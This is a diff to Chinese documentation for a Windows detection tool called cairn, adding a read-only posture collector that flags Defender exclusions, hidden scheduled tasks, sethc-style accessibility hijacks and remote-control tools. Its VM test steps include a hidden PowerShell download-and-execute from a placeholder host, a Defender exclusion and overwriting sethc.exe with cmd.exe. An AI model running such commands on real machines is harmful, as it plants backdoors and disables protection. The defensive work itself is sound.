@@ -59,6 +59,23 @@ FileFix 是同一招的變形：假的文件分享頁面要使用者把「檔案
 
 驗證：在 VM 上按 Win+R 輸入 `powershell -w h -c "iwr http://example.invalid/a.ps1 | iex"`（網址不存在，不會真的下載），再執行 cairn，應該看到一筆 High 的 T1204.004。
 
+## 防禦狀態與遠端控制工具（posture collector，phase 3E）
+
+`posture` collector 只讀取登錄檔與檔案，不修改主機：Defender 設定與排除清單、稽核原則（`AuditQuerySystemPolicy`，需要時在 cairn 自己的 token 啟用 SeSecurityPrivilege，不會設定任何稽核原則）、4688 命令列與 PowerShell 記錄原則、Sysmon、TaskCache 排程工作樹、System32 協助工具程式、Program Files／ProgramData／各使用者 AppData 下的程式資料夾。讀不到的位置會寫進 manifest 的 source errors，不會當成「沒有」。
+
+| 技術 | 檢查內容 | 判斷方式 |
+|---|---|---|
+| T1562.001 | Defender 排除項目（`Windows Defender\Exclusions` 與 `Policies\...\Exclusions` 的 Paths／Extensions／Processes／IpAddresses） | 排除整個磁碟、`\Users`、使用者可寫入資料夾、執行檔或腳本副檔名、cmd／PowerShell／mshta 等直譯器：High；其他排除項目：Medium。排除清單讀不到（新版 Windows 連管理員都可能被拒）會另外列一筆 observation，不當成沒有排除項目 |
+| T1562.001 | Defender 原則 `DisableAntiSpyware`、`DisableRealtimeMonitoring`、`DisableBehaviorMonitoring` | 值為 1：High |
+| T1562.001 | `Windows Defender\Features\TamperProtection` | 不是 5（防竄改保護未開啟）：Medium，屬於設定弱點，不代表已被入侵 |
+| T1053.005 | `Schedule\TaskCache\Tree` 底下的排程工作 | 缺少 `SD` 值（Tarrask 手法，工作排程器看不到），或 `System32\Tasks` 沒有對應檔案：High |
+| T1546.008 | System32 的 sethc／utilman／osk／magnify／narrator／displayswitch／atbroker | 版本資訊 OriginalFilename 是 cmd、PowerShell 或 explorer，或檔案未簽章：High；OriginalFilename 和預期不符：Medium（簽章有效時 Low） |
+| T1219 | 遠端控制工具：AnyDesk、ScreenConnect、TeamViewer、Atera、Splashtop、NetSupport、RustDesk、Supremo、LogMeIn、GoTo／LogMeIn Rescue、Action1、MeshAgent、ngrok、cloudflared、Tailscale、ZeroTier、Radmin、UltraVNC／TightVNC／RealVNC、Chrome Remote Desktop、Level、SimpleHelp、Tactical RMM（行程、服務、安裝資料夾） | 只是存在：Low，說明會請你確認是否經過核准；安裝資料夾或服務機碼 30 天內有變動：Medium；從使用者可寫入路徑執行、未簽章、改名（簽章是該工具但檔名不是，或檔名是該工具但簽章是別人）、或有連往公網 IP 的連線：High。同一台主機有兩種以上：另報一筆 Medium |
+
+記錄缺口（不是偵測）：「稽核處理程序建立」沒開、4688 沒有命令列、登入／排程工作／帳號／群組變更沒有稽核、PowerShell 4104 沒開、沒有 Sysmon，會各列一筆 observation（`logging_posture`）。沒開的記錄，對應的 Sigma 規則和事件記錄偵測就不可能命中；讀不到的設定會寫「無法確認」，不要假設它有開。
+
+驗證：在 VM 上 `Add-MpPreference -ExclusionPath C:\Users\Public`、`copy C:\Windows\System32\cmd.exe` 蓋過 sethc.exe（先取得檔案擁有權）、安裝 AnyDesk，再執行 cairn，應分別看到 T1562.001、T1546.008（High）和 T1219。
+
 ## 每位使用者的位置
 
 Run／RunOnce、COM 劫持、登入腳本、螢幕保護程式、cmd AutoRun、RunMRU 會讀 `HKEY_USERS` 底下每個已載入的使用者，不只是執行 cairn 的那個帳號；Startup 資料夾和 PowerShell profile 會檢查 `C:\Users` 下每個使用者。所以資訊人員用自己的管理員帳號提權執行時，也看得到受害使用者的項目（前提是該使用者目前已登入，或其登錄檔已載入）。
